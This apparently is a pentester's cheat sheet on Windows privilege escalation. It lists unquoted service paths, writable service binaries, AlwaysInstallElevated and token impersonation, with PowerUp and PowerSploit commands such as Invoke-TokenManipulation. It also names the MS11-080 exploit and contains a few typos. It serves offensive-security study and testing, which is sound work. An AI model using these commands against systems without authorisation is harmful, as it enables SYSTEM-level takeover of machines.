# Options
- Missing Patches
- Automated Deployment and Auto Logon Passwords
- AlwaysInstallElevated (any user can run MSI as SYSTEM)
- Misconfigured Services

# Guides
- https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
- Windows Privilege Escalation Fundamentals: http://www.fuzzysecurity.com/tutorials/16.html
  - http://www.fuzzysecurity.com/tutorials.html

# Tools

- BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Windows

# PowerUp

PowerUp to check for all service misconfigurations:
```
Invoke-AllChecks
```

## Service Unquoted Path

```
Get-ServiceUnquoted -Verbose
```

```
Get-WmiObject -Class win32_service | f` *
```

When service path is unquoted:
```
C:\PROGRAM FILES\SUB DIR\PROGRAM NAME
```

Areas we can place files for exploit are marked with *
```
C:\PROGRAM*FILES\SUB*DIR\PROGRAM*NAME
```

Examples:
```
c:\program.exe files\sub dir\program name
c:\program files\sub.exe dir\program name
c:\program files\sub dir\program.exe name
```

## Service binary in a location writable to current user

Replace the binary to gain code execution.

```
Get-ModifiableServiceFile -Verbose
```

## Service can be modified by current user

```
Get-ModifiableService -Verbose
```

# DLL Hijacking
# Token Impersonation

PowerSploit / Incognito

List all tokens
```
Invoke-TokenManipulation -ShowAll
```

List all unique and usable tokens
```
Invoke-TokenManipulation -Enumerate
```

Start new process with token of a user
```
Invoke-TokenManipulation -ImpersonateUser -Username "domain\user"
```

Start new process with token of another process
```
Invoke-TokenManipulation -CreateProcess "C:\Windown\system32\WindowsPowerShell\v1.0\PowerShell.exe" -ProcessId 500
```


# Service privilages
```
icacls example.exe
```
If example.exe is writable to everyone, low privilege user can replace the exe with some other binary

# Important Payloads
- `MS11-080` AfdJoinLeaf xp 2003 both 32 and 64 / MS12-042

```
python py installer module
python pyinsaller.py --onefile example.py
```
